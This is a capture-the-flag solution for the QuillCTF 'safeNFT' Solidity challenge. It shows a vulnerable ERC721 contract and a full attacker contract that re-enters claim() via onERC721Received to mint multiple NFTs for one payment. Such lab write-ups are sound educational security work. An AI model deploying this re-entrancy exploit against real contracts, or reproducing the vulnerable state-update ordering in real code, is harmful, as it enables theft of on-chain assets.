# [safeN.F.T. Challenge](https://quillctf.super.site/challenges/quillctf-challenges/bulletproof-nft)

- Objective of C.T.F.:
1. Claim multiple N.F.T.s for the price of one.

## Analisys and Solution:

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
 
}

/** @audit Step #1: We simply Execute a Re-Entrancy Attack on the "claim()" Function
thanks to the implementation of "IERC721Receiver", and write the Re-Enterancy logic
within the Function"onERC721Received": .*/

contract SafeNFTAttacker is IERC721Receiver {
  uint private claimed;
  uint private count;
  address private owner;
  SafeNFT private target;

  constructor(uint count_, address targetAddr_) {
    target = SafeNFT(targetAddr_);
    count = count_;
    owner = msg.sender;
  }

  // initiate the pwnage by purchasing a single NFT
  // we will re-enter later via onERC721Received
  function pwn() external payable {
    target.buyNFT{value: msg.value}();
    target.claim();
  }

  function claimNext() internal {
    // keep record of the current claim
    claimed++;
    // if we want to keep on claiming, continue re-entering
    // stop if you think they've had enough :)
    if (claimed != count) {
      target.claim();
    }
  }

  function onERC721Received(
    address /*operator*/,
    address /*from*/,
    uint256 tokenId,
    bytes calldata /*data*/
  ) external override returns (bytes4) {
    // forward the claimed NFT to yourself
    target.transferFrom(address(this), owner, tokenId);

    // re-enter
    claimNext();

    return IERC721Receiver.onERC721Received.selector;
  }
}

```
